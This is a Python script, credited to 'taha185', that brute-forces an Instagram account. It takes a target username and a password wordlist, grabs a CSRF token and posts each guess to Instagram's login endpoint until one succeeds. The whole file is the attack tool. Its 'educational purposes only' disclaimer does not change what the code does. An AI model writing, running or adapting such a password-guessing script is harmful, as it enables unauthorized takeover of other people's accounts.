import requests
from termcolor import colored

# Banner
banner = """
 ______     ______     ______   ______     ______     ______
/\  ___\   /\  __ \   /\  ___\ /\  __ \   /\  ___\   /\  __ \
\ \  __\   \ \  __ \  \ \  __\ \ \  __ \  \ \  __\   \ \ \/\ \
 \ \_____\  \ \_\ \_\  \ \_____\ \ \_\ \_\  \ \_____\  \ \_____\
  \/_____/   \/_/\/_/   \/_____/  \/_/\/_/   \/_____/   \/_____/

Made by taha185
"""

print(colored(banner, 'red'))

# Disclaimer
disclaimer = """
Disclaimer:
This script is for educational purposes only. Unauthorized access to computer systems is illegal.
Do not use this script for any malicious activities. The author is not responsible for any misuse of this script.
"""

print(colored(disclaimer, 'yellow'))

# Function to brute force Instagram
def brute_force_instagram(username, password):
    url = "https://www.instagram.com/accounts/login/ajax/"
    login_payload = {
        'username': username,
        'enc_password': '#PWD_INSTAGRAM_BROWSER:0:1674091234:{}'.format(password)
    }
    with requests.Session() as s:
        r = s.get("https://www.instagram.com")
        csrf_token = r.cookies['csrftoken']
        login_payload['csrfmiddlewaretoken'] = csrf_token
        login = s.post(url, data=login_payload, allow_redirects=True)
        if "authenticated" in login.text:
            print(colored(f"[+] Password found: {password}", 'green'))
            return password
        else:
            print(colored(f"[-] Password not found: {password}", 'red'))
            return None

# Main function
def main():
    username = input("Enter Instagram username: ")
    password_list = input("Enter path to password list: ")

    try:
        with open(password_list, 'r') as file:
            for line in file:
                password = line.strip()
                print(colored(f"Trying password: {password}", 'blue'))
                found_password = brute_force_instagram(username, password)
                if found_password:
                    break
    except FileNotFoundError:
        print(colored(f"[-] Error: Password list file not found.", 'red'))
    except Exception as e:
        print(colored(f"[-] Error: {str(e)}", 'red'))

if __name__ == "__main__":
    main()
